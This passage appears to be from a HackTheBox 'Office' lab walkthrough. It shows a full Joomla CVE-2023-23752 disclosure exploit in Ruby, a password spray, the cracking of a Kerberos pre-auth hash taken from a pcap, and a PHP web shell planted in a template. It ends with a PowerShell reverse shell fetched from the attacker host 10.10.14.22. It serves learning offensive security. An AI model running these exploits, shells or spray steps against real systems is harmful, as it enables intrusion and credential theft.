To exploit this we can make a simple GET request to the configuration endpoints using the payload from this [link](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#api-unauthenticated-information-disclosure).

`curl -s 'http://10.10.11.3/api/index.php/v1/config/application?public=true' | jq`:
```json
{
  "links": {
    "self": "http://10.10.11.3/api/index.php/v1/config/application?public=true",
    "next": "http://10.10.11.3/api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20",
    "last": "http://10.10.11.3/api/index.php/v1/config/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"
  },
  "data": [
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline": false,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline_message": "This site is down for maintenance.<br>Please check back again soon.",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "display_offline_message": 1,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "offline_image": "",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "sitename": "Holography Industries",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "editor": "tinymce",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "captcha": "0",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "list_limit": 20,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "access": 1,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "debug": false,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "debug_lang": false,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "debug_lang_const": true,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbtype": "mysqli", 🔍
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "host": "localhost", 🔍
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "user": "root", 📌
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "password": "H0lOgrams4reTakIng0Ver754!", 📌
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "db": "joomla_db", 🔍
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbprefix": "if2tx_",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbencryption": 0,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbsslverifyservercert": false,
        "id": 224
      }
    }
  ],
  "meta": {
    "total-pages": 4
  }
}
```

<🔄 Alternative Step>

Or, we can exploit this using the previously-referenced script, but first we need to install the `httpx`, `docopt` and `paint` dependencies for `Ruby`.

`searchsploit 'Joomla 4.2'`:
```
--------------------------------------------------------------- ---------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ---------------------------------
Joomla! Component com_civicrm 4.2.2 - Remote Code Injection    | php/webapps/24969.txt
Joomla! Component Google Map Landkarten 4.2.3 - SQL Injection  | php/webapps/44113.txt
Joomla! Component ionFiles 4.4.2 - File Disclosure             | php/webapps/6809.txt
Joomla! Component jDownloads 1.0 - Arbitrary File Upload       | php/webapps/17303.txt
Joomla! Component MaQma Helpdesk 4.2.7 - 'id' SQL Injection    | php/webapps/41399.txt
Joomla! Component mydyngallery 1.4.2 - SQL Injection           | php/webapps/7343.txt
Joomla! com_hdwplayer 4.2 - 'search.php' SQL Injection         | php/webapps/48242.txt
Joomla! v4.2.8 - Unauthenticated information disclosure        | php/webapps/51334.py ←
--------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

`mkdir ./htb_office && cd ./htb_office`

`cp /usr/share/exploitdb/exploits/php/webapps/51334.py ./`

`cat ./51334.py`:
```ruby
#!/usr/bin/env ruby

# Exploit
## Title: Joomla! v4.2.8 - Unauthenticated information disclosure
## Exploit author: noraj (Alexandre ZANNI) for ACCEIS (https://www.acceis.fr)
## Author website: https://pwn.by/noraj/
## Exploit source: https://github.com/Acceis/exploit-CVE-2023-23752
## Date: 2023-03-24
## Vendor Homepage: https://www.joomla.org/
## Software Link: https://downloads.joomla.org/cms/joomla4/4-2-7/Joomla_4-2-7-Stable-Full_Package.tar.gz?format=gz
## Version: 4.0.0 < 4.2.8 (it means from 4.0.0 up to 4.2.7)
## Tested on: Joomla! Version 4.2.7
## CVE : CVE-2023-23752
## References:
##   - https://nsfocusglobal.com/joomla-unauthorized-access-vulnerability-cve-2023-23752-notice/
##   - https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html
##   - https://attackerkb.com/topics/18qrh3PXIX/cve-2023-23752
##   - https://nvd.nist.gov/vuln/detail/CVE-2023-23752
##   - https://vulncheck.com/blog/joomla-for-rce
##   - https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2023/CVE-2023-23752.yaml

# standard library
require 'json'
# gems
require 'httpx'
require 'docopt'
require 'paint'

doc = <<~DOCOPT
  #{Paint['Joomla! < 4.2.8 - Unauthenticated information disclosure', :bold]}

  #{Paint['Usage:', :red]}
    #{__FILE__} <url> [options]
    #{__FILE__} -h | --help

  #{Paint['Parameters:', :red]}
    <url>       Root URL (base path) including HTTP scheme, port and root folder

  #{Paint['Options:', :red]}
    --debug     Display arguments
    --no-color  Disable colorized output (NO_COLOR environment variable is respected too)
    -h, --help  Show this screen

  #{Paint['Examples:', :red]}
    #{__FILE__} http://127.0.0.1:4242
    #{__FILE__} https://example.org/subdir

  #{Paint['Project:', :red]}
    #{Paint['author', :underline]} (https://pwn.by/noraj / https://twitter.com/noraj_rawsec)
    #{Paint['company', :underline]} (https://www.acceis.fr / https://twitter.com/acceis)
    #{Paint['source', :underline]} (https://github.com/Acceis/exploit-CVE-2023-23752)
DOCOPT

def fetch_users(root_url, http)
  vuln_url = "#{root_url}/api/index.php/v1/users?public=true"
  http.get(vuln_url)
end

def parse_users(root_url, http)
  data_json = fetch_users(root_url, http)
  data = JSON.parse(data_json)['data']
  users = []
  data.each do |user|
    if user['type'] == 'users'
      id = user['attributes']['id']
      name = user['attributes']['name']
      username = user['attributes']['username']
      email = user['attributes']['email']
      groups = user['attributes']['group_names']
      users << {id: id, name: name, username: username, email: email, groups: groups}
    end
  end
  users
end

def display_users(root_url, http)
  users = parse_users(root_url, http)
  puts Paint['Users', :red, :bold]
  users.each do |u|
    puts "[#{u[:id]}] #{u[:name]} (#{Paint[u[:username], :yellow]}) - #{u[:email]} - #{u[:groups]}"
  end
end

def fetch_config(root_url, http)
  vuln_url = "#{root_url}/api/index.php/v1/config/application?public=true"
  http.get(vuln_url)
end

def parse_config(root_url, http)
  data_json = fetch_config(root_url, http)
  data = JSON.parse(data_json)['data']
  config = {}
  data.each do |entry|
    if entry['type'] == 'application'
      key = entry['attributes'].keys.first
      config[key] = entry['attributes'][key]
    end
  end
  config
end

def display_config(root_url, http)
  c = parse_config(root_url, http)
  puts Paint['Site info', :red, :bold]
  puts "Site name: #{c['sitename']}"
  puts "Editor: #{c['editor']}"
  puts "Captcha: #{c['captcha']}"
  puts "Access: #{c['access']}"
  puts "Debug status: #{c['debug']}"
  puts
  puts Paint['Database info', :red, :bold]
  puts "DB type: #{c['dbtype']}"
  puts "DB host: #{c['host']}"
  puts "DB user: #{Paint[c['user'], :yellow, :bold]}"
  puts "DB password: #{Paint[c['password'], :yellow, :bold]}"
  puts "DB name: #{c['db']}"
  puts "DB prefix: #{c['dbprefix']}"
  puts "DB encryption #{c['dbencryption']}"
end

begin
  args = Docopt.docopt(doc)
  Paint.mode = 0 if args['--no-color']
  puts args if args['--debug']

  http = HTTPX
  display_users(args['<url>'], http)
  puts
  display_config(args['<url>'], http)
rescue Docopt::Exit => e
  puts e.message
end
```

`bundle init`:
```
Writing new Gemfile to /home/kali/htb_office/Gemfile
```

`vim ./Gemfile`:
```
# Gemfile
source "https://rubygems.org"

gem "httpx"
gem "paint"
gem "docopt"
```

`bundle install --path ./vendor/bundle`:
```
[DEPRECATED] The `--path` flag is deprecated because it relies on being remembered across bundler invocations, which bundler will no longer do in future versions. Instead please use `bundle config set --local path 'vendor/bundle'`, and stop using this flag                                                                                                                          
Fetching gem metadata from https://rubygems.org/....
Resolving dependencies...
Fetching http-2 1.0.2
Fetching paint 2.3.0
Fetching docopt 0.6.1
Installing docopt 0.6.1
Installing http-2 1.0.2
Installing paint 2.3.0
Fetching httpx 1.3.3
Installing httpx 1.3.3
Bundle complete! 3 Gemfile dependencies, 5 gems now installed.
Bundled gems are installed into `./vendor/bundle`
```

After installing the script's dependencies, we can execute it.

`bundle exec ruby ./51334.py`:
```
Usage:
  51334.py <url> [options]
  51334.py -h | --help
```

`bundle exec ruby ./51334.py http://10.10.11.3`:
```
Users
[474] Tony Stark (Administrator) - Administrator@holography.htb - Super Users 📌

Site info
Site name: Holography Industries
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli 🔍
DB host: localhost 🔍
DB user: root 📌
DB password: H0lOgrams4reTakIng0Ver754! 📌
DB name: joomla_db 🔍
DB prefix: if2tx_
DB encryption 0
```

The script returns credentials found in the exposed endpoints.

</🔄 Alternative Step>

Attempting to authenticate to the website fails. It's clear at this point that we do not have access to the website with these credentials since they are just database credentials.

Now, using `NetExec`, we attempt a password spray against the known users.

`netexec smb 10.10.11.3 -u ./domain_users.txt -p 'H0lOgrams4reTakIng0Ver754!' --continue-on-success`:
```
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\dlanor:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\dmichael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 🔑
SMB         10.10.11.3      445    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
```

We have a password for `dwolfe`.

`netexec smb 10.10.11.3 -u 'dwolfe' -p 'H0lOgrams4reTakIng0Ver754!'`:
```
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!
```

`netexec smb 10.10.11.3 -u 'dwolfe' -p 'H0lOgrams4reTakIng0Ver754!' --shares`:
```
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
SMB         10.10.11.3      445    DC               [*] Enumerated shares
SMB         10.10.11.3      445    DC               Share           Permissions     Remark
SMB         10.10.11.3      445    DC               -----           -----------     ------
SMB         10.10.11.3      445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.3      445    DC               C$                              Default share
SMB         10.10.11.3      445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.3      445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.3      445    DC               SOC Analysis    READ 🔍         
SMB         10.10.11.3      445    DC               SYSVOL          READ            Logon server share 
```

`netexec winrm 10.10.11.3 -u 'dwolfe' -p 'H0lOgrams4reTakIng0Ver754!'`:
```
WINRM       10.10.11.3      5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb)
WINRM       10.10.11.3      5985   DC               [-] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!
```
❌

`netexec smb 10.10.11.3 -u 'dwolfe' -p 'H0lOgrams4reTakIng0Ver754!' --users`:
```
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
SMB         10.10.11.3      445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.3      445    DC               Administrator                 2023-05-10 19:00:50 0       Built-in account for administering the computer/domain 
SMB         10.10.11.3      445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.3      445    DC               krbtgt                        2023-04-14 22:14:59 0       Key Distribution Center Service Account 
SMB         10.10.11.3      445    DC               PPotts                        2023-05-02 22:44:57 0        
SMB         10.10.11.3      445    DC               HHogan                        2023-05-06 18:59:34 0        
SMB         10.10.11.3      445    DC               EWhite                        2023-05-08 00:06:54 0        
SMB         10.10.11.3      445    DC               etower                        2023-05-08 00:07:38 0        
SMB         10.10.11.3      445    DC               dwolfe                        2023-05-08 00:09:54 0        
SMB         10.10.11.3      445    DC               dmichael                      2023-05-08 00:09:01 0        
SMB         10.10.11.3      445    DC               dlanor                        2023-05-08 00:09:24 0        
SMB         10.10.11.3      445    DC               tstark                        2023-05-09 01:32:00 0        
SMB         10.10.11.3      445    DC               web_account                   2024-01-17 17:51:08 0        
SMB         10.10.11.3      445    DC               [*] Enumerated 12 local users: OFFICE
```

`netexec smb 10.10.11.3 -u 'dwolfe' -p 'H0lOgrams4reTakIng0Ver754!' --pass-pol`:
```
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
SMB         10.10.11.3      445    DC               [+] Dumping password info for domain: OFFICE
SMB         10.10.11.3      445    DC               Minimum password length: 7
SMB         10.10.11.3      445    DC               Password history length: 24
SMB         10.10.11.3      445    DC               Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.10.11.3      445    DC               
SMB         10.10.11.3      445    DC               Password Complexity Flags: 000000
SMB         10.10.11.3      445    DC                   Domain Refuse Password Change: 0
SMB         10.10.11.3      445    DC                   Domain Password Store Cleartext: 0
SMB         10.10.11.3      445    DC                   Domain Password Lockout Admins: 0
SMB         10.10.11.3      445    DC                   Domain Password No Clear Change: 0
SMB         10.10.11.3      445    DC                   Domain Password No Anon Change: 0
SMB         10.10.11.3      445    DC                   Domain Password Complex: 0
SMB         10.10.11.3      445    DC               
SMB         10.10.11.3      445    DC               Minimum password age: 1 day 4 minutes 
SMB         10.10.11.3      445    DC               Reset Account Lockout Counter: 1 minute 
SMB         10.10.11.3      445    DC               Locked Account Duration: 1 minute 
SMB         10.10.11.3      445    DC               Account Lockout Threshold: 20 📌
SMB         10.10.11.3      445    DC               Forced Log off Time: Not Set
```

`netexec smb 10.10.11.3 -u 'dwolfe' -p 'H0lOgrams4reTakIng0Ver754!' --users | awk '{ print $5 }' | grep -v -F '[' | grep -v '-' | awk '{ print tolower($0) }' | sort -u | tee ./domain_users.txt`:
```
administrator
dlanor
dmichael
dwolfe
etower
ewhite
guest
hhogan
krbtgt
ppotts
tstark
web_account
```

`smbclient -U 'dwolfe' --password='H0lOgrams4reTakIng0Ver754!' '//10.10.11.3/SOC Analysis'`:
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed May 10 20:52:24 2023
  ..                                DHS        0  Wed Feb 14 11:18:31 2024
  Latest-System-Dump-8fbc124d.pcap      A  1372860  Mon May  8 02:59:00 2023 🔍

                6265599 blocks of size 4096. 1257741 blocks available
smb: \> get Latest-System-Dump-8fbc124d.pcap
getting file \Latest-System-Dump-8fbc124d.pcap of size 1372860 as Latest-System-Dump-8fbc124d.pcap (723.9 KiloBytes/sec) (average 723.9 KiloBytes/sec)
```

`file ./*.pcap`:
```
Latest-System-Dump-8fbc124d.pcap: pcapng capture file - version 1.0
```

Looking through the packets to find interesting information is difficult, as there are too many
packets. Since we know that this environment is within an Active Directory, we can attempt to filter
out some authentication packets to see if any exist. We use a filter such as the following: `(tcp.port == 110 or tcp.port == 25 or tcp.port == 143 or udp.port == 161 or tcp.port == 21 or tcp.port == 80 or (ntlmssp) or (kerberos))`.

`tshark -r ./Latest-System-Dump-8fbc124d.pcap -Y "(tcp.port == 110 or tcp.port == 25 or tcp.port == 143 or udp.port == 161 or tcp.port == 21 or tcp.port == 80 or smb or ntlmssp or kerberos)"`:
```
[...]

Warning: program compiled against libxml 212 using older 209
 1876   7.645215  10.250.0.41 → 10.250.0.30  SMB2 224 Session Setup Request, NTLMSSP_NEGOTIATE
 1877   7.645308  10.250.0.30 → 10.250.0.41  SMB2 359 Session Setup Response, Error: STATUS_MORE_PROCESSING_REQUIRED, NTLMSSP_CHALLENGE
 1878   7.646708  10.250.0.41 → 10.250.0.30  SMB2 247 Session Setup Request, NTLMSSP_AUTH, User: \
 1908   7.682483  10.250.0.41 → 10.250.0.30  KRB5 245 AS-REQ 🔍
 1917   7.803090  10.250.0.41 → 10.250.0.30  KRB5 323 AS-REQ 🔍
```

`wireshark ./Latest-System-Dump-8fbc124d.pcap &`

<img src="./assets\screenshots\hackthebox_office_wireshark_pcap_file_analysis1.png" alt="HackTheBox - Office | wireshark Latest-System-Dump-8fbc124d.pcap 1" width="700"/>

`tshark -r Latest-System-Dump-8fbc124d.pcap -Y "frame.number == 1908" -V | grep -i 'cnamestring' -B3 -A1`:
```
            cname
                name-type: kRB5-NT-PRINCIPAL (1)
                cname-string: 1 item
                    CNameString: tstark 📌
            realm: OFFICE.HTB
```

We discover the user authenticating is called `tstark`. In the second AS-REQ packet, we get a
timestamp hash.

<img src="./assets\screenshots\hackthebox_office_wireshark_pcap_file_analysis2.png" alt="HackTheBox - Office | wireshark Latest-System-Dump-8fbc124d.pcap 2" width="700"/>

`tshark -r Latest-System-Dump-8fbc124d.pcap -Y "frame.number == 1917" -V | grep -i 'cipher' -B5`:
```
        padata: 2 items
            PA-DATA pA-ENC-TIMESTAMP
                padata-type: pA-ENC-TIMESTAMP (2) 📌
                    padata-value: 3041a003020112a23a0438a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
                        etype: eTYPE-AES256-CTS-HMAC-SHA1-96 (18) 📌
                        cipher: a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc 🔍
```

With a little research about Kerberos, which can be found [here](https://blog.netwrix.com/what-is-kerberos), we know that the initial packet of `AS-REQ` contains a timestamp encrypted with the user's password, meaning that we can retrieve this timestamp from the packet capture and attempt to crack it.
An example hash format from KRB `pre-auth` can be found [here](https://hashcat.net/wiki/doku.php?id=example_hashes):
```
19900 | Kerberos 5, etype 18, Pre-Auth | $krb5pa$18$hashcat$HASHCATDOMAIN.COM$96c289009b05181bfd32062962740b1b1ce5f74eb12e0266cde74e81094661addab08c0c1a178882c91a0ed89ae4e0e68d2820b9cce69770
```

After modifying the hash value, we can attempt to crack it with `Hashcat`.

`vim ./krb5pa18.txt`:
```
$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
```

`hashcat -m 19900 ./krb5pa18.txt /usr/share/wordlists/rockyou.txt`:
```
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-penryn-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 1438/2941 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69 🔑
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 19900 (Kerberos 5, etype 18, Pre-Auth)
Hash.Target......: $krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c56...86f5fc
Time.Started.....: Thu Nov 14 11:49:37 2024 (2 secs)
Time.Estimated...: Thu Nov 14 11:49:39 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     3490 H/s (8.15ms) @ Accel:128 Loops:256 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5120/14344385 (0.04%)
Rejected.........: 0/5120 (0.00%)
Restore.Point....: 4608/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3840-4095
Candidate.Engine.: Device Generator
Candidates.#1....: Liverpool -> babygrl
Hardware.Mon.#1..: Util: 74%

Started: Thu Nov 14 11:49:35 2024
Stopped: Thu Nov 14 11:49:40 2024
```

The password `playboy69` is obtained.

`netexec smb 10.10.11.3 -u 'tstark' -p 'playboy69'`:
```
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+]
```

`netexec smb 10.10.11.3 -u 'tstark' -p 'playboy69' --shares`:
```
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] office.htb\tstark:playboy69 
SMB         10.10.11.3      445    DC               [*] Enumerated shares
SMB         10.10.11.3      445    DC               Share           Permissions     Remark
SMB         10.10.11.3      445    DC               -----           -----------     ------
SMB         10.10.11.3      445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.3      445    DC               C$                              Default share
SMB         10.10.11.3      445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.3      445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.3      445    DC               SOC Analysis                    
SMB         10.10.11.3      445    DC               SYSVOL          READ            Logon server share 
```

`netexec winrm 10.10.11.3 -u 'tstark' -p 'playboy69'`:
```
WINRM       10.10.11.3      5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb)
WINRM       10.10.11.3      5985   DC               [-] office.htb\tstark:playboy69
```
❌

Going back to our initial Joomla exploit output, we notice Tony Stark is the `administrator` on Joomla. We navigate to the default administrator logon page `/administrator` and attempt to authenticate.

`firefox http://10.10.11.3/administrator/index.php &`

<img src="./assets\screenshots\hackthebox_office_firefox_80_administrator_index.png" alt="HackTheBox - Office | firefox http://10.10.11.3/administrator/index.php" width="700"/>

We successfully authenticate and land on the Joomla dashboard. Since we have administrator privileges in the web app, we can edit a template and inject some PHP code there. We navigate to `System` -> `Site Templates` -> `Cassiopeia Details and Files` -> `offline.php` and inject the following payload:
```php
<?php
if (isset($_REQUEST['cmd'])) {
	system($_REQUEST['cmd']);
}

[...]
```

<img src="./assets\screenshots\hackthebox_office_firefox_80_administrator_edit_offline_php.png" alt="HackTheBox - Office | firefox http://10.10.11.3/administrator/index.php?option=com_templates&view=template&id=223&file=Ly9vZmZsaW5lLnBocA%3D%3D&isMedia=0" width="700"/>

We test if we can get remote code execution with the following command.

`curl 'http://10.10.11.3/templates/cassiopeia/offline.php?cmd=whoami'`:
```
office\web_account
```

`rlwrap nc -lnvp 4444`:
```
listening on [any] 4444 ...
```

`ls -l ./tools/nishang/Shells`:
```
total 136
-rw-rw-r-- 1 kali kali 24118 Nov 14 16:20 Invoke-ConPtyShell.ps1
-rw-rw-r-- 1 kali kali  6461 Nov 14 16:20 Invoke-JSRatRegsvr.ps1
-rw-rw-r-- 1 kali kali  7330 Nov 14 16:20 Invoke-JSRatRundll.ps1
-rw-rw-r-- 1 kali kali  6767 Nov 14 16:20 Invoke-PoshRatHttp.ps1
-rw-rw-r-- 1 kali kali  9669 Nov 14 16:20 Invoke-PoshRatHttps.ps1
-rw-rw-r-- 1 kali kali  4125 Nov 14 16:20 Invoke-PowerShellIcmp.ps1
-rw-rw-r-- 1 kali kali   665 Nov 14 16:20 Invoke-PowerShellTcpOneLineBind.ps1
-rw-rw-r-- 1 kali kali   983 Nov 14 16:20 Invoke-PowerShellTcpOneLine.ps1
-rw-rw-r-- 1 kali kali  4339 Nov 14 16:20 Invoke-PowerShellTcp.ps1
-rw-rw-r-- 1 kali kali   713 Nov 14 16:20 Invoke-PowerShellUdpOneLine.ps1
-rw-rw-r-- 1 kali kali  5689 Nov 14 16:20 Invoke-PowerShellUdp.ps1
-rw-rw-r-- 1 kali kali 14194 Nov 14 16:20 Invoke-PowerShellWmi.ps1
-rw-rw-r-- 1 kali kali  6390 Nov 14 16:20 Invoke-PsGcatAgent.ps1
-rw-rw-r-- 1 kali kali 11034 Nov 14 16:20 Invoke-PsGcat.ps1
-rw-rw-r-- 1 kali kali  1023 Nov 14 16:20 Remove-PoshRat.ps1
```

`cp ./tools/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 ./shell.ps1`

`cat ./shell.ps1`:
```powershell
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
#$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

#$sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```

`vim ./shell.ps1`:
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.22',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

`python3 -m http.server 80`:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

`burpsuite` > `http://10.10.11.3/templates/cassiopeia/offline.php?cmd=whoami`

`HTTP Request`:
```http
POST /templates/cassiopeia/offline.php HTTP/1.1
Host: 10.10.11.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: 770f5c99f1b67a1cc480471651b7d9b3=3fosniq3gak40800ekiqachdc0
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

cmd=powershell.exe IEX(new-object net.webclient).downloadstring('http://10.10.14.22/shell.ps1')
```

<🔄 Alternative Step>

`curl "http://10.10.11.3/templates/cassiopeia/offline.php?cmd=powershell.exe+IEX(new-object+net.webclient).downloadstring('http://10.10.14.22/shell.ps1')"`

</🔄 Alternative Step>

```
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.3] 49261

PS C:\xampp\htdocs\joomla\templates\cassiopeia>
```

![Victim: web_account](https://custom-icon-badges.demolab.com/badge/Victim-web%5F_account-64b5f6?logo=windows11&logoColor=white)

`whoami`
```
office\web_account
```

`dir C://Users/web_account/Desktop`:
```
```
❌

`whoami /all`:
```
USER INFORMATION
----------------

User Name          SID                                          
================== =============================================
office\web_account S-1-5-21-1199398058-4196589450-691661856-1118


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
